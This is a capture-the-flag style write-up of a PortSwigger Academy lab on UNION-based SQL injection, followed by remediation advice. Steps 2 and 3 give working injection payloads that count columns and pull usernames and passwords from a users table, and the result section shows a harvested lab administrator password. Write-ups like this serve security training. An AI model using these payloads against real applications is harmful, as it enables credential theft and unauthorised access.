```markdown
# Lab: SQL Injection UNION Attack, Retrieving Data from Other Tables

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection  
**Difficulty:** Practitioner  
**Author:** Mostafa Abdelmonem  

---

## Environment & Tools Used
* **Browser:** Google Chrome (configured with **FoxyProxy**)
* **Interception / Inspection Tool:** Burp Suite / Browser URL Bar
* **Target Application:** E-Commerce Web Application

---

## Vulnerability Overview & Technical Mechanics

A `UNION`-based SQL Injection vulnerability occurs when an application appends user input directly into a database query that renders output on the web page. The `UNION` operator allows an attacker to append the results of an injected query to the original query executed by the backend.

### Key Requirements for a Successful `UNION` Attack:
1. **Column Count Matching:** The injected query must return the exact same number of columns as the original query.
2. **Data Type Compatibility:** The data types of columns in the injected query must be compatible with those in the original query.

---

## Technical Walkthrough & Exploitation Steps

### Step 1: Identifying the Vulnerable Parameter
Navigated to the application homepage and selected the **"Gifts"** product category. The browser URL updated to reflect the filter:

```http
[https://target-app.web-security-academy.net/filter?category=Gifts](https://target-app.web-security-academy.net/filter?category=Gifts)

```

This confirmed that product data is dynamically fetched using the `category` GET parameter.

### Step 2: Determining Column Count via `NULL` Injection

To execute a successful `UNION` attack without knowing database column types, the `NULL` value was used to iteratively test the required column count.

#### A. Single Column Attempt:

Appended `' UNION SELECT NULL--` to close the original string literal and test for a single column:

```http
/filter?category=Gifts' UNION SELECT NULL--

```

* **Response:** `HTTP 500 Internal Server Error`
* **Analysis:** The database query failed because the column count did not match the original query.

#### B. Two Columns Attempt:

Appended a second `NULL` value:

```http
/filter?category=Gifts' UNION SELECT NULL, NULL--

```

* **Response:** `HTTP 200 OK`
* **Outcome:** The page rendered successfully without database errors, confirming that the original query selects **exactly two columns**.

---

### Step 3: Extracting Database Records (`users` Table)

Knowing the backend query expects two columns, the `NULL` placeholders were substituted with target column names (`username` and `password`) against the target database table (`users`):

```http
/filter?category=Gifts' UNION SELECT username, password FROM users--

```

#### Final Payload Breakdown:

* `'`: Closes the original string parameter context.
* `UNION SELECT`: Merges the results of the second query with the application's category search results.
* `username, password`: Specifies the two target data columns to retrieve.
* `FROM users`: Targets the user credentials repository table.
* `--`: Comments out trailing syntax from the original backend query.

---

## Proof of Concept (PoC) & Exploitation Result

* **Extracted Data:** Executing the payload rendered all database user records directly into the HTML product listing interface, exposing the administrator credentials:
* **Target Username:** `administrator`
* **Harvested Password:** `2p4jlrcbo70ffhd2pnkk`


* **Lab Resolution:** Navigated to the `/login` endpoint ("My account"), authenticated using the extracted `administrator` credentials, and successfully completed the challenge.

---

## Remediation & Prevention

1. **Use Parameterized Queries (Prepared Statements):**
Completely neutralizes SQL Injection by separating executable query logic from user data parameters.
```java
String query = "SELECT * FROM products WHERE category = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, userCategory);
ResultSet results = stmt.executeQuery();

```


2. **Implement Object-Relational Mapping (ORM):**
Utilize modern ORM frameworks (e.g., Hibernate, Entity Framework) that abstract raw SQL handling and enforce default query parameterization.

```
